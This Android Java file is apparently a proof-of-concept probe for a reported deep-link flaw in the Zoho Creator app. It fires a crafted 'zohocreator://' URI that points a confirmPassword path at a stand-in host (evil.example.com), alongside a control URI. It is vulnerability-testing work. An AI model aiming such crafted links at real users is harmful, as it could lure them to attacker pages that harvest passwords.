package com.example.zohointentprobe;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.net.Uri;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final String TARGET = "com.zoho.creator.a";
    private static final String CRAFTED =
        "zohocreator://evil.example.com/portal/x/y/confirmPassword?x=creator.zoho.com";
    private static final String CONTROL =
        "zohocreator://creator.zoho.com/portal/x/y/confirmPassword";

    private TextView output;

    @Override
    public void onCreate(Bundle state) {
        super.onCreate(state);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(28, 32, 28, 24);

        TextView heading = new TextView(this);
        heading.setText("Zoho Creator Deep Link Test");
        heading.setTextSize(22);
        heading.setGravity(Gravity.CENTER);
        layout.addView(heading);

        TextView note = new TextView(this);
        note.setText("Tap a test. The app sends ACTION_VIEW directly; Chrome is not involved. " +
            "It does not access accounts, credentials, or network resources.");
        note.setTextSize(15);
        note.setPadding(0, 18, 0, 18);
        layout.addView(note);

        addButton(layout, "1. Crafted URI (target Zoho package)", () -> launch(CRAFTED, true));
        addButton(layout, "2. Control URI (target Zoho package)", () -> launch(CONTROL, true));
        addButton(layout, "3. Crafted URI (implicit intent)", () -> launch(CRAFTED, false));

        output = new TextView(this);
        output.setTextSize(13);
        output.setTextIsSelectable(true);
        output.setPadding(0, 24, 0, 0);
        output.setText("Ready. Logged-out testing is recommended for the reported path.");
        ScrollView scroll = new ScrollView(this);
        scroll.addView(output);
        layout.addView(scroll, new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1));

        setContentView(layout);
    }

    private void addButton(LinearLayout parent, String label, Runnable action) {
        Button button = new Button(this);
        button.setText(label);
        button.setAllCaps(false);
        button.setOnClickListener(v -> action.run());
        parent.addView(button);
    }

    private void launch(String value, boolean targetPackage) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(value));
        if (targetPackage) intent.setPackage(TARGET);

        output.setText("Sending intent:\n" + intent.toString() +
            "\n\nURI:\n" + value + "\n\nTarget package: " +
            (targetPackage ? TARGET : "(implicit)") + "\n\n");

        try {
            startActivity(intent);
            output.append("startActivity() returned without an immediate exception.\n" +
                "This only confirms dispatch; it does NOT prove the URL loaded in an app WebView.");
        } catch (Exception e) {
            output.append("FAILED: " + e.getClass().getName() + "\n" +
                String.valueOf(e.getMessage()));
        }
    }
}
